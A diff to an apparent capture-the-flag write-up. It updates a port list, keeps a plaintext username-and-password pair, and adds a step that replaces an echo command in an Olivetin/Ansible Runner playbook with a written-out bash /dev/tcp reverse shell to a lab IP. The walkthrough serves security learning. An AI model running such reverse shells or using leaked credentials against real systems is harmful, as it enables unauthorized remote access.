@@ -36,7 +36,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ##
     *80 — lychee*
     *8080 — python http server*
-    *3000 — gitea*
+    *22,222 — ssh*
 </br>
 
 ### Performing a scan using Dirsearch
@@ -146,6 +146,25 @@ ansible runner (olivetin): port 1337
 </br>
  samarium:TUmhyZ37CLZrhP
 </br>
+
+### Upon obtaining this information, we realized that there is a Gitea server running on port 3000, and we have obtained valid credentials for it.
+
+![Screenshot from 2023-07-06 21-31-32](https://github.com/ACHUX21/Writeups/assets/130113878/d5da60f1-a1cd-4731-af5d-89b6eccc7f87)
+
+# Gaining access
+![image](https://github.com/ACHUX21/Writeups/assets/130113878/23cfac7c-5b54-494f-a91b-be69ffc138f1)
+</br>
+
+Given our knowledge of Ansible Runner (Olivetin) on port 1337, which enables the execution of Ansible playbooks, I intend to replace the existing "echo" command with a reverse shell.
+
+```bash
+bash -c "bash -i >& /dev/tcp/10.18.81.1/14632 0>&1"
+```
+
+
+
+
+
 
  
  
